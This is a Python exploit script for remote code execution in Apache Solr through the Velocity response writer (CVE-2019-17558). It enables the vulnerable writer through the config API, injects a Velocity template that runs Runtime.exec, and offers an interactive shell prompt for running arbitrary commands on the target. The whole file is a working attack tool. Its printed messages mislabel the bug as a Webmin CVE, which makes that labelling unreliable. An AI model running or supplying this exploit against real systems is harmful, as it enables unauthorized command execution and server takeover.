# -*- coding:utf-8 -*-
# Written by hacden 2020/08/30
# Exec python3

import requests
import sys
import json
import urllib.parse


requests.packages.urllib3.disable_warnings()
headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    'Connection': "close",
    "Content-Type": "application/json"
}
def check_solr_17558_rce(url_dir):
    core_name_url = urllib.parse.urljoin(url_dir,"/solr/admin/cores?indexInfo=false&wt=json")
    r = requests.get(url=core_name_url, headers=headers, timeout=5, verify=False)
    core_name = list(json.loads(r.text)["status"])[0]
    return core_name.strip()


def open_solr_17558_rce(url_dir,core_name):
    api_url = url_dir + "/solr/" + core_name + "/config"
    set_api_data = """
    {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }
    """
    res = requests.post(url=api_url, data=set_api_data, headers=headers,timeout=5, verify=False)
    return res.status_code

def exploit_solr_17558_rce(url_dir,cmd,core_name):
    vuln_url = url_dir+"/solr/"+core_name+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"+cmd.strip()+"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    result = requests.get(url=vuln_url, headers=headers,timeout=5, verify=False)
    print(result.text.strip())

def verify(proctol, ip, port):
    ip = ip.strip()
    if port.strip():
        url_dir = proctol .strip() + "://" + ip + ":" + port.strip()
    else:
        url_dir = proctol .strip() + "://" + ip
    try:
        core_name = check_solr_17558_rce(url_dir)
        open_ok = open_solr_17558_rce(url_dir, core_name)
        if core_name and open_ok == 200:
            print("----------------[+] Find Webmin CVE-2019-15107_RCE Vuln!. Iuput [exit] to out! [+]----------------")
            while 1:
                cmd = str(input("shell$: ")).strip()
                if cmd == "exit":
                    exit(1)
                else:
                    exploit_solr_17558_rce(url_dir,cmd,core_name)
        else:
            pass
    except Exception as e:
        msg = "[-] There is Not Seem Webmin CVE-2019-15107_RCE Vuln! Error: %s " % str(e)
        return False, msg
    msg = "[-] There is Not Seem Webmin CVE-2019-15107_RCE  Vuln!"
    return False, msg
if __name__ == '__main__':
    ip = "  192.168.43.90"
    print(verify("http", ip, "8913"))